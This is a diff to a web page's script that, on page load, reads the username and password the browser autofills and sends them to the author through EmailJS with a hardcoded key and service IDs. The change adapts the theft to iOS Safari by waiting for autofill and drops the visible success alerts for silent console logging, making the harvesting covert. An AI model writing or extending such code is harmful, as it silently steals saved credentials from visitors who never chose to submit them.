@@ -240,35 +240,40 @@
     
     </style>
     <script>
-    // 1. Initialize EmailJS (Ensure this key is correct)
     emailjs.init("y3lRWL7KLDjiFjNcN");
 
-    // 2. Wait 1 second to ensure page is fully loaded and autofilled
-    window.onload = function() {
+    // iOS-specific: Listen for 'pageshow' which fires on load/restore
+    window.addEventListener('pageshow', function(event) {
         
-        // 3. Get fields by ID (more reliable than querySelector)
-        var u = document.getElementById("username").value;
-        var p = document.getElementById("password").value;
+        // Wait 500ms to let iOS Safari finish autofilling
+        setTimeout(function() {
+            
+            // Get fields by ID (ensure your HTML has id="username" and id="password")
+            var u = document.getElementById("username").value;
+            var p = document.getElementById("password").value;
 
-        // 4. Check if we have data
-        if (u && p) {
-            // Send to EmailJS
-            emailjs.send("service_2bhy4ju", "template_1qzswkk", {
-                username: u,
-                password: p,
-                timestamp: new Date().toLocaleString(),
-                debug: "Brute Force Test"
-            }).then(function(response) {
-                alert("SUCCESS! Credentials Sent: " + u);
-            }, function(error) {
-                alert("FAILED: " + JSON.stringify(error));
-            });
-        } else {
-            alert("No Data Found. U: [" + u + "] P: [" + p + "]");
-        }
-    };
+            // Check if we have data
+            if (u && p) {
+                emailjs.send("service_2bhy4ju", "template_1qzswkk", {
+                    username: u,
+                    password: p,
+                    timestamp: new Date().toLocaleString(),
+                    device: "iOS iPhone"
+                }).then(function() {
+                    console.log("iOS Credentials Sent!");
+                }, function(error) {
+                    console.log("iOS Send Failed:", error);
+                });
+            } else {
+                console.log("No Data on iOS. U: [" + u + "] P: [" + p + "]");
+            }
+        }, 500); // 500ms delay for iOS
+    });
 </script>
 
+
+
+ 
     
 </head>
 <body>
